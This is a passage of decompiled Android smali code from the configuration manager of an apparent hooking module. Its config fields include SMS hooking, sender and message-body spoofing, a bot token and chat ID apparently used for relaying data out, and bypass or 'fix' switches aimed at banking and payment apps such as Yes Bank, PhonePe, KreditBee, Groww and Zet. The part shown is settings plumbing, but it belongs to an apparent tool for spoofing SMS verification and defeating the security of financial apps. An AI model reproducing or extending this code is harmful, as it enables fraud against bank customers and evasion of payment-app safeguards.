    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 916
    throw v0
.end method

.method public setSuperMoneyBypassEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 367
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 369
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 370
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->supermoney_bypass:Z

    .line 371
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 373
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 374
    nop

    .line 375
    return-void

    .line 373
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 374
    throw v0
.end method

.method public setTimerMultiplier(I)V
    .locals 2
    .param p1, "multiplier"    # I

    .line 950
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 952
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 953
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    const/4 v1, 0x1

    invoke-static {v1, p1}, Ljava/lang/Math;->max(II)I

    move-result v1

    iput v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->timer_multiplier:I

    .line 954
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 956
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 957
    nop

    .line 958
    return-void

    .line 956
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 957
    throw v0
.end method

.method public setVerificationDelay(I)V
    .locals 2
    .param p1, "seconds"    # I

    .line 939
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 941
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 942
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    const/4 v1, 0x0

    invoke-static {v1, p1}, Ljava/lang/Math;->max(II)I

    move-result v1

    iput v1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->verification_delay:I

    .line 943
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 945
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 946
    nop

    .line 947
    return-void

    .line 945
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 946
    throw v0
.end method

.method public setYesBankBypassEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 498
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 500
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 501
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->yesbank_bypass:Z

    .line 502
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 504
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 505
    nop

    .line 506
    return-void

    .line 504
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 505
    throw v0
.end method

.method public setZetSecurityBypassEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 352
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 354
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 355
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->zet_security_bypass:Z

    .line 356
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 358
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 359
    nop

    .line 360
    return-void

    .line 358
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 359
    throw v0
.end method

.method public setZetSrcPrefixEnabled(Z)V
    .locals 2
    .param p1, "z"    # Z

    .line 468
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 470
    :try_start_0
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->readConfigFromFile()Lcom/rebel/module/ConfigManager$ConfigData;

    move-result-object v0

    .line 471
    .local v0, "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iput-boolean p1, v0, Lcom/rebel/module/ConfigManager$ConfigData;->zet_src_prefix:Z

    .line 472
    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 474
    nop

    .end local v0    # "configFromFile":Lcom/rebel/module/ConfigManager$ConfigData;
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 475
    nop

    .line 476
    return-void

    .line 474
    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 475
    throw v0
.end method

.method public final writeConfigToFile(Lcom/rebel/module/ConfigManager$ConfigData;)Z
    .locals 9
    .param p1, "configData"    # Lcom/rebel/module/ConfigManager$ConfigData;

    .line 961
    const-string v0, "/data/local/tmp/src_module_config.json"

    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->lock()V

    .line 963
    const/4 v1, 0x0

    :try_start_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 964
    .local v2, "file":Ljava/io/File;
    invoke-virtual {p0}, Lcom/rebel/module/ConfigManager;->ensureConfigFileExists()V

    .line 965
    new-instance v3, Landroid/util/JsonWriter;

    new-instance v4, Ljava/io/FileWriter;

    invoke-direct {v4, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Landroid/util/JsonWriter;-><init>(Ljava/io/Writer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 967
    .local v3, "jsonWriter":Landroid/util/JsonWriter;
    :try_start_1
    const-string v4, "  "

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->setIndent(Ljava/lang/String;)V

    .line 968
    invoke-virtual {v3}, Landroid/util/JsonWriter;->beginObject()Landroid/util/JsonWriter;

    .line 969
    const-string v4, "hook_sms"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->hook_sms:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 970
    const-string v4, "spoof_sender"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_sender:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 971
    const-string v4, "spoof_direction"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_direction:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 972
    const-string v4, "bot_token"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->bot_token:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 973
    const-string v4, "chat_id"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->chat_id:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 974
    const-string v4, "sender_id"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->sender_id:Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const-string v6, ""

    if-eqz v5, :cond_0

    :try_start_2
    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->sender_id:Ljava/lang/String;

    goto :goto_0

    :cond_0
    move-object v5, v6

    :goto_0
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 975
    const-string v4, "spoof_body"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_body:Ljava/lang/String;

    if-eqz v5, :cond_1

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_body:Ljava/lang/String;

    goto :goto_1

    :cond_1
    move-object v5, v6

    :goto_1
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 976
    const-string v4, "gms_sender"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->gms_sender:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 977
    const-string v4, "sms_sender"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->sms_sender:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 978
    const-string v4, "spoof_mobile"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_mobile:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 979
    const-string v4, "sms_mobile"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->mobile_no:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 980
    const-string v4, "isRoot"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    if-eqz v5, :cond_2

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->isRoot:Ljava/lang/String;

    goto :goto_2

    :cond_2
    move-object v5, v6

    :goto_2
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 981
    const-string v4, "exp_date"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->exp_date:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 982
    const-string v4, "registred_id"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->registred_id:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 983
    const-string v4, "whitelist"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist:Ljava/lang/String;

    if-eqz v5, :cond_3

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist:Ljava/lang/String;

    goto :goto_3

    :cond_3
    move-object v5, v6

    :goto_3
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 984
    const-string v4, "blacklist"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->blacklist:Ljava/lang/String;

    if-eqz v5, :cond_4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->blacklist:Ljava/lang/String;

    goto :goto_4

    :cond_4
    move-object v5, v6

    :goto_4
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 985
    const-string v4, "whitelist_mode"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->whitelist_mode:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 986
    const-string v4, "spoof_preset"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    .line 987
    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_preset:Ljava/lang/String;

    if-eqz v5, :cond_5

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->spoof_preset:Ljava/lang/String;

    goto :goto_5

    :cond_5
    const-string v5, "custom"

    :goto_5
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 988
    const-string v4, "footer_text"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->footer_text:Ljava/lang/String;

    if-eqz v5, :cond_6

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->footer_text:Ljava/lang/String;

    goto :goto_6

    :cond_6
    move-object v5, v6

    :goto_6
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 989
    const-string v4, "verification_delay"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->verification_delay:I

    int-to-long v7, v5

    invoke-virtual {v4, v7, v8}, Landroid/util/JsonWriter;->value(J)Landroid/util/JsonWriter;

    .line 990
    const-string v4, "timer_multiplier"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->timer_multiplier:I

    int-to-long v7, v5

    invoke-virtual {v4, v7, v8}, Landroid/util/JsonWriter;->value(J)Landroid/util/JsonWriter;

    .line 991
    const-string v4, "fix_navi"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_navi:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 992
    const-string v4, "fix_phonepe"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_phonepe:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 993
    const-string v4, "fix_kreditbee"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_kreditbee:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 994
    const-string v4, "number_prefix"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    .line 995
    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->number_prefix:Ljava/lang/String;

    if-eqz v5, :cond_7

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->number_prefix:Ljava/lang/String;

    goto :goto_7

    :cond_7
    move-object v5, v6

    :goto_7
    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 996
    const-string v4, "smart_token"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->smart_token:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 997
    const-string v4, "yesbank_bypass"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->yesbank_bypass:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 998
    const-string v4, "sms_hooking_2"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->sms_hooking_2:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 999
    const-string v4, "fix_zet"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zet:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1000
    const-string v4, "zet_upi"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->zet_upi:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1001
    const-string v4, "zet_src_prefix"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->zet_src_prefix:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1002
    const-string v4, "zet_security_bypass"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->zet_security_bypass:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1003
    const-string v4, "supermoney_bypass"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->supermoney_bypass:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1004
    const-string v4, "fix_groww"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

